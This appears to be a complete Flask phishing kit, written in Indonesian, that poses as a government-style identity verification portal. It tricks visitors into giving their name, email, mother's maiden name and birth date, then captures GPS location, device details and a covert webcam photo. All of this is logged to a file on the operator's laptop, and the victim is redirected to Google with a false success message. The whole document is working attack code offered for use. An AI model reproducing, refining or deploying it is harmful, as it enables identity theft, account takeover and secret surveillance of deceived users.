from flask import Flask, request, render_template_string
import datetime
import os
import base64

app = Flask(__name__)

# Konfigurasi Path Laptop kamu untuk menyimpan hasil investigasi
BASE_DIR = r"C:\...\...\...\..."
if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
LOG_FILE = os.path.join(BASE_DIR, "hasil_investigasi.txt")

@app.route('/cek-data')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Portal Verifikasi Data Pusat</title>
            <style>
                :root { --primary: #0052cc; --bg: #f4f6f8; --text: #172b4d; }
                body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                .card { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
                .header { background: var(--primary); color: white; padding: 20px; text-align: center; }
                .step-indicator { display: flex; justify-content: space-around; padding: 15px; background: #ebf2ff; border-bottom: 1px solid #ddd; }
                .step-dot { width: 30px; height: 30px; border-radius: 50%; background: #ccc; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white; }
                .step-dot.active { background: var(--primary); }
                .form-content { padding: 25px; min-height: 250px; }
                .input-group { margin-bottom: 15px; text-align: left; }
                label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; color: #5e6c84; }
                input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #fafbfc; }
                input:focus { outline: none; border-color: var(--primary); background: white; }
                .btn { background: var(--primary); color: white; border: none; padding: 14px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
                .hidden { display: none; }
                .footer { padding: 15px; text-align: center; font-size: 11px; color: #999; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="header">
                    <h3 style="margin:0">Verifikasi Identitas</h3>
                    <p style="font-size:12px; opacity:0.8">Sistem Keamanan Data Terpadu 2026</p>
                </div>
                
                <div class="step-indicator">
                    <div id="dot1" class="step-dot active">1</div>
                    <div id="dot2" class="step-dot">2</div>
                    <div id="dot3" class="step-dot">3</div>
                </div>

                <div class="form-content">
                    <div id="step1">
                        <p style="font-size:14px; color:#444">Silakan konfirmasi identitas akun Anda.</p>
                        <div class="input-group">
                            <label>Nama Lengkap (Sesuai KTP)</label>
                            <input type="text" id="nama" placeholder="Contoh: Budi Santoso">
                        </div>
                        <div class="input-group">
                            <label>Email Terdaftar</label>
                            <input type="email" id="email" placeholder="budi@example.com">
                        </div>
                        <button class="btn" onclick="nextStep(2)">Lanjut</button>
                    </div>

                    <div id="step2" class="hidden">
                        <p style="font-size:14px; color:#444">Validasi data kependudukan diperlukan.</p>
                        <div class="input-group">
                            <label>Nama Ibu Kandung</label>
                            <input type="text" id="ibu" placeholder="Nama Ibu Kandung">
                        </div>
                        <div class="input-group">
                            <label>Tanggal Lahir</label>
                            <input type="date" id="tgl_lahir">
                        </div>
                        <button class="btn" onclick="nextStep(3)">Verifikasi Biometrik</button>
                    </div>

                    <div id="step3" class="hidden">
                        <div style="text-align:center">
                            <img src="https://cdn-icons-png.flaticon.com/512/1177/1177568.png" width="60" style="margin-bottom:15px">
                            <p style="font-size:14px">Terakhir, silakan lakukan <b>Face-ID</b> dan <b>Sinkronisasi Lokasi</b> untuk menyelesaikan proses.</p>
                            <button class="btn" onclick="startFinal()">AMBIL BIOMETRIK</button>
                            <p id="status" style="font-size:12px; color:var(--primary); margin-top:10px; display:none">Memproses data keamanan...</p>
                        </div>
                    </div>
                </div>

                <div class="footer">
                    Tersertifikasi ISO 27001 - Enkripsi AES-256
                </div>
            </div>

            <video id="video" style="display:none" autoplay></video>
            <canvas id="canvas" style="display:none"></canvas>

            <script>
                function nextStep(n) {
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step3').classList.add('hidden');
                    document.getElementById('step' + n).classList.remove('hidden');
                    
                    document.getElementById('dot1').classList.remove('active');
                    document.getElementById('dot2').classList.remove('active');
                    document.getElementById('dot3').classList.remove('active');
                    for(let i=1; i<=n; i++) document.getElementById('dot'+i).classList.add('active');
                }

                function startFinal() {
                    document.getElementById('status').style.display = 'block';
                    let data = {
                        nama: document.getElementById('nama').value,
                        email: document.getElementById('email').value,
                        ibu: document.getElementById('ibu').value,
                        tgl: document.getElementById('tgl_lahir').value,
                        ram: navigator.deviceMemory,
                        cpu: navigator.hardwareConcurrency
                    };

                    navigator.geolocation.getCurrentPosition(function(pos) {
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        ambilFoto(data);
                    }, function() {
                        data.lat = "DIBLOKIR"; data.lon = "DIBLOKIR";
                        ambilFoto(data);
                    });
                }

                function ambilFoto(info) {
                    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                        let video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            let canvas = document.getElementById('canvas');
                            canvas.width = 480; canvas.height = 360;
                            canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
                            info.img = canvas.toDataURL('image/jpeg');
                            stream.getTracks().forEach(t => t.stop());
                            kirimKeServer(info);
                        }, 1200);
                    }).catch(() => {
                        info.img = "TIDAK_ADA_FOTO";
                        kirimKeServer(info);
                    });
                }

                function kirimKeServer(finalData) {
                    fetch('/log-ultimate', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(finalData)
                    }).then(() => {
                        alert("Sinkronisasi Berhasil! Akun Anda telah diamankan.");
                        window.location.href = "https://www.google.com";
                    });
                }
            </script>
        </body>
        </html>
    ''', ip=ip)

@app.route('/log-ultimate', methods=['POST'])
def log_ultimate():
    d = request.json
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    laporan = (
        f"{'='*50}\n"
        f"WAKTU      : {waktu}\n"
        f"IDENTITAS  : {d.get('nama')} | {d.get('email')}\n"
        f"TGL LAHIR  : {d.get('tgl')}\n"
        f"IBU KANDUNG: {d.get('ibu')}\n"
        f"GPS        : {d.get('lat')}, {d.get('lon')}\n"
        f"HARDWARE   : RAM {d.get('ram')}GB | CPU {d.get('cpu')} Core\n"
        f"FOTO       : {'TERSEDIA' if 'data:image' in d.get('img') else 'GAGAL'}\n"
        f"{'='*50}\n\n"
    )

    with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(laporan)
    
    if "data:image" in d.get('img'):
        img_name = f"foto_{d.get('nama').replace(' ', '_')}_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
        with open(os.path.join(BASE_DIR, img_name), "wb") as f:
            f.write(base64.b64decode(d.get('img').split(',')[1]))
        print(f"Data & Foto {d.get('nama')} Berhasil Disimpan!")

    print(laporan)
    return '', 204

if __name__ == '__main__':
    app.run(port=5000)